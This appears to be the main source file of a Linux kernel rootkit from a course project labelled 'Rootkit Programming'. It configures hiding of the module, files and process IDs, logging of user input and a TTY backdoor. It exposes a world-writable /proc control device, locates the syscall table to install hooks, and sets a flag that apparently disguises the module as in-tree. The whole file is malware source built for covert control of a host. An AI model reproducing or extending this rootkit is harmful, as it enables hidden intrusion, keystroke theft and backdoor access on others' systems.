#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/printk.h>

#include "ioctl.h"
#include "channel.h"
#include "common.h"
#include "rootkit.h"

#define BUFLEN 4096


static int  __init g7_init(void);
static void __exit g7_exit(void);

static int     g7_fops_open(struct inode *, struct file *);
static int     g7_fops_release(struct inode *, struct file *);
static ssize_t g7_fops_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t g7_fops_write(struct file *, const char *, size_t, loff_t *);
static long    g7_fops_ioctl(struct file *, unsigned, unsigned long);


static struct mutex lock;
static char buf[BUFLEN];

static struct file_operations g7_fops =
{
    .owner          = THIS_MODULE,
    .read           = g7_fops_read,
    .write          = g7_fops_write,
    .open           = g7_fops_open,
    .unlocked_ioctl = g7_fops_ioctl,
    .release        = g7_fops_release,
};


rootkit_t rootkit = {
    .hiding_module = true,
    .hiding_files  = true,
    .hiding_open   = true,
    .hiding_pids   = true,
    .logging_input = true,
    .backdoor = BD_TTY,
};


static int
g7_fops_open(struct inode *inode, struct file *file)
{
    mutex_lock(&lock);
    DEBUG_INFO("[g7_fops_open]\n");
    return 0;
}

static int
g7_fops_release(struct inode *inode, struct file *file)
{
    DEBUG_INFO("[g7_fops_release]\n");
    mutex_unlock(&lock);
    return 0;
}

static ssize_t
g7_fops_read(struct file *file, char __user *buf, size_t len, loff_t *off)
{
    DEBUG_INFO("[g7_fops_read]\n");
    return 0;
}

static ssize_t
g7_fops_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
    DEBUG_INFO("[g7_fops_write]\n");
    return 0;
}

static long
g7_fops_ioctl(struct file *_file, unsigned cmd, unsigned long arg)
{
    channel_t c = detect_channel(cmd);
    DEBUG_NOTICE("[g7_fops_ioctl] on %#10x (%s)\n", cmd, c.name);

    if (c.handler)
        return c.handler(arg);
    else
        return -ENOTTY;
}


static int
g7_init(void)
{
    mutex_init(&lock);
    proc_create_data(G7_DEVICE, 0777, NULL, &g7_fops, buf);

    if (retrieve_sys_call_table())
        return -1;

    init_hooks();
    DEBUG_INFO("[g7_init] at /proc/%s\n", G7_DEVICE);
    report_channels();

    return 0;
}

static void
g7_exit(void)
{
    remove_proc_entry(G7_DEVICE, 0);
    remove_hooks();
    DEBUG_INFO("[g7_exit]\n");
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Group 7");
MODULE_DESCRIPTION("Rootkit Programming");
MODULE_INFO(intree, "Y");

module_init(g7_init);
module_exit(g7_exit);
